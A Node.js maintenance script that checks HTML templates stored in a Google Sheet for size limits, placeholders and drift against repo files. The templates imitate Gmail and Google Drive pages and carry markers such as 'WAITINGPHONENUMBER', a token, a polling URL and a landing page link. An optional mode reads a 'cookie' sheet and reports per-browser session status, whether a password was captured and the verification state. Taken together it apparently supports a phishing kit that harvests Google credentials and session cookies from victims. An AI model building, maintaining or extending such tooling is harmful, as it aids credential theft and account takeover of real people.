// tools/template-init.js — verify-only session bootstrap for template work.
// Reads the master template sheet + repo files, reports drift/size/markers.
// NEVER WRITES: uses spreadsheets.readonly scope; no update calls anywhere.
//   node tools/template-init.js [--niche gmail] [--type COOKIE] [--browserId <id>] [--json]
// Exit: 0 clean · 2 drift/over-limit/placeholder-loss · 1 tool error.
const fs = require('fs');
const path = require('path');
const JSON5 = require('json5');

const ROOT = path.join(__dirname, '..');
const MASTER_SID = '17cjaHx93z3ciGAdgJ4AvkjgIwI9gP3RsfJU5G7exp-U'; // = GAS CONFIG.DB_ID (POST.js:6)
const HARD_LIMIT = 50000;
const GATE = 49500;
const RENDER_SLACK = 200; // {{placeholders}} expand in projects copies

// templateId -> { file, niche, mustMarkers }
const MAP = {
    tpt17: { file: 'gmail-serverless.min.html', niche: 'gmail', markers: ['#cardProgress{', 'WAITINGPHONENUMBER', '{{formId}}'] },
    tpt18: { file: 'gmail-serverless.min.html', niche: 'gmail', markers: ['#cardProgress{', 'WAITINGPHONENUMBER', '{{formId}}'] },
    tpt16: { file: 'gmail-plain.html', niche: 'gmail', drift: false, markers: ['{{formId}}'] },
    tpt20: { file: 'google-drive-serverless.min.html', niche: 'drive', markers: ['#cardProgress{', 'WAITINGPHONENUMBER', '{{formId}}', '{{file1Name}}'] },
    tpt21: { file: 'google-drive-serverless.min.html', niche: 'drive', markers: ['#cardProgress{', 'WAITINGPHONENUMBER', '{{formId}}', '{{file1Name}}'] },
};
const PLACEHOLDERS = ['{{formId}}', '{{token}}', '{{pollingUrl}}', '{{updateUrl}}', '{{landingPageLink}}'];

function args() {
    const a = { niche: 'gmail', type: null, browserId: null, json: false };
    const v = process.argv.slice(2);
    for (let i = 0; i < v.length; i++) {
        if (v[i] === '--niche') a.niche = v[++i];
        else if (v[i] === '--type') a.type = v[++i];
        else if (v[i] === '--browserId') a.browserId = v[++i];
        else if (v[i] === '--json') a.json = true;
    }
    return a;
}
function env(k) {
    const m = fs.readFileSync(path.join(ROOT, '.env'), 'utf8').match(new RegExp('^' + k + '=(.*)$', 'm'));
    return m ? m[1].trim() : '';
}
function firstDiff(a, b) {
    const n = Math.min(a.length, b.length);
    for (let i = 0; i < n; i++) if (a[i] !== b[i]) return i;
    return a.length === b.length ? -1 : n;
}

(async () => {
    const opts = args();
    const report = { ok: true, rows: [], session: null, errors: [] };
    const fail = (msg) => { report.ok = false; report.errors.push(msg); };

    const { web } = JSON5.parse(env('GOOGLE_OAUTH2_JSON').replace(/^["']|["']$/g, ''));
    const { google } = require('googleapis');
    const client = new google.auth.OAuth2(web.client_id, web.client_secret);
    client.setCredentials({ refresh_token: env('GOOGLE_DRIVE_REFRESH_TOKEN').replace(/^["']|["']$/g, '') });
    const { token } = await client.getAccessToken().catch((e) => ({ err: e }));
    if (!token) { fail('Sheets auth failed (OAuth refresh token)'); return done(); }
    // NOTE: readonly scope enforced by re-scoping the client for reads.
    client.setCredentials({ refresh_token: env('GOOGLE_DRIVE_REFRESH_TOKEN').replace(/^["']|["']$/g, ''), scope: 'https://www.googleapis.com/auth/spreadsheets.readonly' });
    const sheets = google.sheets({ version: 'v4', auth: client });

    const t = await sheets.spreadsheets.values.get({ spreadsheetId: MASTER_SID, range: 'template!A1:H60' })
        .catch((e) => ({ err: e }));
    if (t.err || !t.data) { fail('Master template tab unreadable: ' + (t.err && t.err.message)); return done(); }
    const rows = t.data.values || [];
    for (let i = 1; i < rows.length; i++) {
        const row = rows[i];
        const tid = row[1] || '', type = row[4] || '', name = row[5] || '';
        const map = MAP[tid];
        if (!map) continue;
        if (opts.niche && !new RegExp(opts.niche, 'i').test(name)) continue;
        if (opts.type && String(type).toUpperCase() !== String(opts.type).toUpperCase()) continue;
        const code = row[7] || '';
        const entry = { sheetRow: i + 1, templateId: tid, type, name, cellLen: code.length, gate: null, placeholders: {}, markers: {}, drift: null };
        if (code.length > HARD_LIMIT) { entry.gate = 'OVER-HARD-LIMIT'; fail(`${tid} cell ${code.length} exceeds ${HARD_LIMIT}`); }
        else if (code.length + RENDER_SLACK > HARD_LIMIT) { entry.gate = 'OVER-RENDERED-LIMIT'; fail(`${tid} rendered copy would exceed ${HARD_LIMIT}`); }
        else if (code.length > GATE) { entry.gate = 'OVER-GATE'; fail(`${tid} cell ${code.length} exceeds gate ${GATE}`); }
        else entry.gate = 'PASS';
        for (const p of PLACEHOLDERS) {
            const has = code.includes(p);
            entry.placeholders[p] = has;
            if (!has) fail(`${tid} cell missing placeholder ${p}`);
        }
        for (const m of map.markers) entry.markers[m] = code.includes(m);
        if (map.drift === false) {
            entry.drift = 'SKIPPED (no repo equivalent tracked)';
        } else try {
            const local = fs.readFileSync(path.join(ROOT, map.file), 'utf8');
            const norm = (s) => s.replace(/form_prj_[a-z0-9]+/gi, '{{formId}}');
            const at = firstDiff(norm(code), norm(local));
            entry.drift = at === -1 ? 'EQUAL' : `DIFF@${at} (cell ${code.length} vs repo ${local.length})`;
            if (at !== -1) fail(`${tid} cell differs from ${map.file} at offset ${at}`);
        } catch (e) { entry.drift = 'REPO-UNREADABLE: ' + e.message; fail(entry.drift); }
        report.rows.push(entry);
    }
    if (!report.rows.length) fail('No mapped template rows matched (check --niche/--type)');

    if (opts.browserId) {
        const dbId = env('DB_ID');
        const c = await sheets.spreadsheets.values.get({ spreadsheetId: dbId, range: 'cookie!A1:BZ3000' })
            .catch((e) => ({ err: e }));
        if (c.err || !c.data) fail('cookie sheet unreadable: ' + (c.err && c.err.message));
        else {
            const all = c.data.values || [], h = all[0] || [];
            const ci = (n) => h.indexOf(n);
            const found = all.find((r, ix) => ix > 0 && r[ci('browserId')] === opts.browserId);
            if (!found) fail(`browserId ${opts.browserId} not found in cookie sheet`);
            else {
                const ljpRaw = found[ci('lastJsonResponse')] || '';
                let ljp = null;
                try { ljp = JSON.parse(ljpRaw); } catch (e) { /* raw */ }
                report.session = {
                    status: found[ci('status')] || '',
                    passwordSet: (found[ci('password')] || '').length > 0,
                    lastUserActivity: found[ci('lastUserActivity')] || '',
                    verificationState: ljp && ljp.verificationState,
                    viewName: ljp && ljp.viewName,
                    message: ljp && String(ljp.message || '').slice(0, 160),
                };
            }
        }
    }

    function done() {
        if (opts.json) console.log(JSON.stringify(report, null, 2));
        else {
            for (const r of report.rows) {
                console.log(`row${r.sheetRow} ${r.templateId} ${r.type} ${r.name}: len=${r.cellLen} gate=${r.gate} drift=${r.drift}`);
                const missPh = Object.keys(r.placeholders).filter((k) => !r.placeholders[k]);
                const missMk = Object.keys(r.markers).filter((k) => !r.markers[k]);
                if (missPh.length) console.log(`  MISSING placeholders: ${missPh.join(' ')}`);
                if (missMk.length) console.log(`  missing markers: ${missMk.join(' ')}`);
            }
            if (report.session) console.log('session:', JSON.stringify(report.session));
            for (const e of report.errors) console.log('ERROR: ' + e);
            console.log(report.ok ? 'INIT-OK' : 'INIT-ISSUES');
        }
        process.exit(report.ok ? 0 : 2);
    }
    done();
})().catch((e) => { console.error('INIT-FAILED: ' + e.message); process.exit(1); });
